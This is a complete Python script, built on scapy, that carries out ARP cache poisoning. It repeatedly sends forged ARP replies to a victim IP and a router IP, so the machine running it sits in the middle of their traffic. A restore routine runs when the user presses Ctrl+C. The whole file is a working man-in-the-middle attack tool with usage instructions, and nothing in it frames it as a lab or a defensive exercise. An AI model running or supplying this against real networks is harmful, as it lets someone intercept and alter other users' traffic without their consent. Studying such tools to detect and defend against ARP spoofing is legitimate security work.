from scapy.all import *
import sys
import time

def arp_spoof(dest_ip, dest_mac, source_ip):
    """
    Send spoofed ARP packet to poison the target's ARP cache
    """
    # Create ARP response packet (op=2) claiming we are the source_ip
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    """
    Send legitimate ARP packet to restore correct ARP table
    """
    packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def main():
    # Check command line arguments
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpSpoof.py <victim_ip> <router_ip>")
        print("Example: sudo python3 arpSpoof.py 192.168.1.100 192.168.1.1")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    
    # Get MAC addresses
    print("Resolving MAC addresses...")
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    
    if victim_mac is None:
        print(f"Error: Could not find MAC address for victim IP: {victim_ip}")
        sys.exit(1)
    if router_mac is None:
        print(f"Error: Could not find MAC address for router IP: {router_ip}")
        sys.exit(1)
    
    print(f"Victim: {victim_ip} -> {victim_mac}")
    print(f"Router: {router_ip} -> {router_mac}")
    print("ARP spoofing started. Press Ctrl+C to stop and restore ARP tables.")
    
    try:
        packet_count = 0
        while True:
            # Spoof victim: tell victim we are the router
            arp_spoof(victim_ip, victim_mac, router_ip)
            # Spoof router: tell router we are the victim
            arp_spoof(router_ip, router_mac, victim_ip)
            
            packet_count += 2
            print(f"\rSpoofed packets sent: {packet_count}", end="", flush=True)
            time.sleep(2)  # Wait 2 seconds between sends
            
    except KeyboardInterrupt:
        print("\n\nRestoring ARP tables...")
        # Restore victim's ARP table: tell victim the real router MAC
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        # Restore router's ARP table: tell router the real victim MAC
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        print("ARP tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
